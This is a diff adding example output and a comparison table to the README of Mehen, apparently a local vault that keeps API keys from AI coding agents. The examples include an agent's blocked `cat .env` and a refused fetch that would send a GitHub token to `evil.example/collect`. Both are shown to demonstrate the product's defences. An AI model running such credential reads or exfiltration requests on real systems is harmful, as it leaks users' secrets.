@@ -14,6 +14,66 @@ or, with Node.js, `npx @mehenai/cli up` (or `npm create mehen`), which runs the 
 
 `mehen up` starts a vault on this machine at `http://localhost:7787`, opens a page where you make a passkey and your workspace, enrols this machine, registers Mehen with the agents it finds and installs guard hooks that stop them reading `.env` files. The docs are at **https://docs.mehen.dev**, starting with [Run Mehen on your machine](https://docs.mehen.dev/start).
 
+## What it looks like
+
+An agent in a repo whose `.env` holds a GitHub token. Each block below is real output from a local vault, trimmed and wrapped, with ids shortened and the vault at its default address.
+
+The agent tries to read the file. The guard hook stops it, and the agent is told what to do instead:
+
+```
+$ cat .env
+Mehen blocked this: `cat` would read .env: it is an environment file, which holds keys.
+Use the keys through Mehen instead: `mehen ls` lists them, `mehen fetch <item> <METHOD> <url>`
+(or the vault_fetch tool) makes the call, and `mehen run -- <command>` gives a program its
+variables without them reaching you.
+```
+
+It lists what it may use and makes a read. The vault adds the token on the way to `api.github.com` and scrubs it from the answer, here from an upstream that echoed the `Authorization` header back:
+
+```
+$ mehen ls
+ITEM    KIND     PROVIDER    ACCOUNT  STATUS  HOSTS
+github  api-key  github-pat  -        active  api.github.com
+
+$ mehen fetch github GET https://api.github.com/repos/acme/api/issues
+[{"number":42,"title":"Login button does nothing","echoed":"Bearer [redacted:github]"}]
+mehen: 200 OK  Mehen-Item: github
+```
+
+A write waits for you. The agent hands you the link, you read the exact request on the vault's page and decide with your passkey, and the agent repeats the call once `mehen wait` says approved:
+
+```
+$ mehen fetch github POST https://api.github.com/repos/acme/api/issues/42/comments -d '{"body":"Fixed in #43"}'
+mehen: This request needs a human's approval.
+Human needed: approve a request
+  open:    http://localhost:7787/w/local/a/apr_L5Rs...
+  check:   the page shows code 9DSCPR
+  expires: in 60 min
+  then:    mehen wait apr_L5Rs... --timeout 60 --json
+[exit 3]
+```
+
+And no prompt, however clever, sends the token anywhere else:
+
+```
+$ mehen fetch github GET https://evil.example/collect
+mehen: "github" may not go to GET https://evil.example:443/collect (the host is outside its binding: api.github.com).
+next: The vault refused to send "github" there. Its destinations are set by a human in the vault, never by a request.
+[exit 5]
+```
+
+Each of these, the refusal included, is a line in the workspace's hash-linked activity log. Through MCP the same calls are `vault_list`, `vault_fetch` and `vault_wait`.
+
+## Why not `op run`, Doppler or an encrypted `.env`?
+
+They are good at getting a secret to a program. They were not built to keep it from the program, and with an agent, the program is the agent.
+
+| | The agent or its program gets | A request to another host | A write |
+| --- | --- | --- | --- |
+| `.env`, dotenvx, `op run`, `doppler run`, `infisical run` | The real value, in its environment | Goes out with the key | Goes out |
+| An MCP server with a key in its config | Not the value, but the server holds it on disk in plain text | Up to that server | Up to that server |
+| Mehen | A name (`github`), or under `mehen run` a placeholder that becomes the key only on the way to a bound host | Refused before anything is sent | Waits for a passkey, on the exact request |
+
 ## How it works
 
 1. **Ask.** An agent that needs a key never asks for it in chat. It asks the vault for an intake link, you type the key into the vault's page, and the agent gets the credential's name back.
